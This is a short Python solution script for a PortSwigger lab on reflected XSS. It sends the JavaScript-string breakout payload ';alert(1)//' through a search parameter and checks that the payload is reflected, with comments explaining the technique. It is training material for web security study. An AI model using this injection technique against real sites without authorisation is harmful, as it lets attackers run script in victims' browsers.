# Lab 09 — Reflected XSS into a JavaScript string with angle brackets HTML-encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
#
# Vulnerability: Search functionality — input lands inside a JS string
# Aim:           Call alert by breaking out of the JavaScript string
#
# Technique:
#   Angle brackets are encoded → can't inject HTML tags.
#   But the input is inside a <script> block:
#     var searchTerms = 'SEARCH_TERM';
#
#   Break out of the string with ';  then call alert, then comment out the rest:
#     Input:  ';alert(1)//
#     Result: var searchTerms = '';alert(1)//'';
#                               ↑ ends var   ↑ comment
#
# Usage: python xss_lab09.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "';alert(1)//"

if __name__ == "__main__":
    banner()
    section("LAB 09 — REFLECTED XSS: JS STRING CONTEXT, ANGLE BRACKETS ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab09.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "JS string break payload")

    print()
    print("  ➜  Open this URL in a browser to confirm alert fires:")
    print(f"     {r.url}")
    print("  ℹ  ' closes the JS string. alert(1) is a separate statement. // silences the rest.")
